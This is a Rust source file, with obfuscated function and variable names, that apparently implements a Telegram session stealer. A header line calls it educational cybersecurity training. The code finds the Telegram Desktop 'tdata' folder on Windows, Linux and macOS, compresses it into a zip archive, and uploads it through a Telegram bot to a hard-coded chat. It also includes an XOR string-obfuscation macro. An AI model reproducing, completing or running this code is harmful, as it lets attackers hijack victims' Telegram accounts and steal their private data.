//! The "shortneer" project is an educational initiative designed for cybersecurity training; any misuse is punishable by law.This code obfuscate.
use std::collections::HashMap;
use std::fs::File;
use std::io::{self, Cursor, Seek, SeekFrom};
use std::path::{Path, PathBuf};
use teloxide::{prelude::*, types::InputFile};
use walkdir::WalkDir;
use zip::write::{FileOptions, ZipWriter};
use zip::CompressionMethod::Deflated;

fn edrh0x(path: &Path, dbnvzqa: &[&str]) -> bool {
    dbnvzqa.iter().any(|b| {
        path.components()
            .any(|comp| comp.as_os_str().to_string_lossy().eq_ignore_ascii_case(b))
    })
}

fn drhfjz0zx() -> PathBuf {
    #[cfg(target_os = "windows")]
    {
        let drf80x0ygh = std::env::var("APPDATA").expect("");
        PathBuf::from(drf80x0ygh).join("Telegram Desktop\\tdata")
    }

    #[cfg(target_os = "linux")]
    {
        let dfh5zx = std::env::var("HOME").expect("");
        PathBuf::from(dfh5zx).join(".local/share/TelegramDesktop/tdata")
    }

    #[cfg(target_os = "macos")]
    {
        let dfh5zx = std::env::var("HOME").expect("");
        PathBuf::from(dfh5zx).join("Library/Application Support/Telegram Desktop/tdata")
    }

    #[cfg(not(any(target_os = "windows", target_os = "linux", target_os = "macos")))]
    {
        compile_error!("");
    }
}

fn gfhrt0jhu60x0rg() -> io::Result<Cursor<Vec<u8>>> {
    let dfg45ygmk = drhfjz0zx();
    let mut tmap = HashMap::new();
    tmap.insert("dhxcne3hrhr5", dfg45ygmk);
    let mut vchr4ft5 = Cursor::new(Vec::new());
    let options: FileOptions<()> = FileOptions::default().compression_method(Deflated);
    let dbnvzqa = vec![
        ".wrangler",
        ".git",
        "node_modules",
        "user_data",
        "temp",
        "thumbnails",
        "emoji",
    ];
    {
        let mut zy3fg1jh = ZipWriter::new(&mut vchr4ft5);

        for entry in &tmap {
            for file_entry in WalkDir::new(&entry.1).into_iter().filter_map(|e| e.ok()) {
                let path = file_entry.path();
                if edrh0x(&path, &dbnvzqa) {
                    continue;
                }
                if path.is_file() {
                    if let Ok(mut file) = File::open(&path) {
                        if let Some(entry_path) = path.strip_prefix(&entry.1).unwrap().to_str() {
                            zy3fg1jh.start_file(entry_path, options).unwrap();
                            io::copy(&mut file, &mut zy3fg1jh).expect("");
                        }
                    } else {
                        println!("");
                    }
                }
            }
        }
        zy3fg1jh.finish().expect("");
    }
    vchr4ft5.seek(SeekFrom::Start(0))?;

    Ok(vchr4ft5)
}
macro_rules! ut {
    ($bytes:expr) => {{
        const KEY: u8 = 0xAA;
        let deobfuscated: Vec<u8> = $bytes.iter().map(|&b| b ^ KEY).collect();
        String::from_utf8(deobfuscated).expect("")
    }};
}

pub async fn fghjikr0tyhu5() -> Result<(), Box<dyn std::error::Error>> {
    let bot = Bot::new("9999999999:abcdefghijklmnopqrstuvwxyzABCDE12345");
    let chat_id = ChatId(-1009999999999);

    let jk697uth = gfhrt0jhu60x0rg()?;
    let t6us = jk697uth.get_ref().clone();

    let dfdrfhu0ytxzakr = InputFile::memory(t6us).file_name("fghjj5.zip");
    bot.send_document(chat_id, dfdrfhu0ytxzakr).await?;

    Ok(())
}
